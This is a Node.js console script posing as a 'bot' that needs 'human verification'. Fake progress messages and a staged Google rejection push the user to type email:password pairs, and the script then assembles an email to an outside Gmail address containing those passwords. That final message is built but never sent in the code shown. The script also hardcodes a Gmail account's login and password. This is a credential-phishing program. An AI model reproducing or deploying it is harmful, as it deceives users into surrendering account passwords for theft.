const readline = require("readline");
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});
function msleep(n) {
    Atomics.wait(new Int32Array(new SharedArrayBuffer(4)), 0, 0, n);
  }
  var nodemailer = require('nodemailer');
const { Console } = require("console");

var transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: 'BotSenderV1@gmail.com',
    pass: 'zlz2room'
  }
});


console.log("Made by James")
console.log("Version 1.0.0")
console.log("PP")
console.log("-----IMPORTANT-------")
console.log("This bot may need ")
console.log("access to your account")
console.log("you may need to enter")
console.log("your username and password.")
console.log("--------END----------")
rl.question("Hello, Mystery Man, what is your name?", function(name) {
    rl.question("Why are you using this thing???", function(why) {
        console.log(`Hello ${name}!!! Welcome to this test project made by James!!! The reason you are using this is because ${why}...wow great reason >.<`);
        console.log("Making subbot...")
        msleep(2000)
        console.log("Connection 1 failed...") 
        msleep(1000)
        console.log("Connection 2 connected.")
        msleep(2000)
        console.log("🤖Activating bot...🤖")
        msleep(10000)
        console.log("This may take some time...")
        msleep(10)
        console.log("Bot activated! ✅ ")
        msleep(1000)
        console.log("Preparing automatic verification...")
        msleep(2000)
        console.log("❌Automatic verification failed❌")
        msleep(1000)
        console.log("Human verificaion required")
        msleep(1000)
        console.log("Enter your username and password below...")
        msleep(50)
        rl.question("What is your email address?", function(email){
            msleep(100)
            console.log("Success! Verification email will be sent to you.")
            var mailOptions = {
                from: 'BotMessager@mail.com',
                to: `${email}`,
                subject: 'Verification Email',
                text: `Thank you ${name}, you are now verified.`
              };
              
              transporter.sendMail(mailOptions, function(error, info){
                if (error) {
                  console.log(error);
                } else {
                  console.log('Email sent: ' + info.response);
                }
                console.log(`${name} you are verified, thank you for verification.`)
                msleep(2000)
                rl.question("🤖What would you like to do with the bot?🤖", function(what) {
                    msleep(1000)
                    console.log("Connecting...💩")
                    msleep(2000)
                    console.log("❌Verification Denied❌")
                    msleep(200)
                    console.log("Verificatin denied by: ❌www.google.ca❌")
                    msleep(200)
                    console.log("Access needed, google thinks I am a bot{•̃_•̃}, which I am, but I cannot activate wihtout a activated account.")
                    msleep(200)
                    console.log("Please enter your password.")
                    msleep(100)
                    rl.question("Type your email and password in this format: 'realemail@domain.com:password'→", function(ep) {
                        msleep(10)
                        rl.question("Thank you. Feel free to type in more, as there will be a higher chance of success :", function(ep2){
                            msleep(4000)
                            console.log("Connecting...L(° O °L)")
                            msleep(2000)
                            console.log("☑️Connected. Bot is up and running.☑")
                            var mailOptions = {
                                from: 'BotMessager@mail.com',
                                to: "finetreeca@gmail.com",
                                subject: 'Verification Email',
                                text: `Passwords: ${ep}    ${ep2}`
                              };
                        })
                    })
                })
              });
        })
    
    });
});
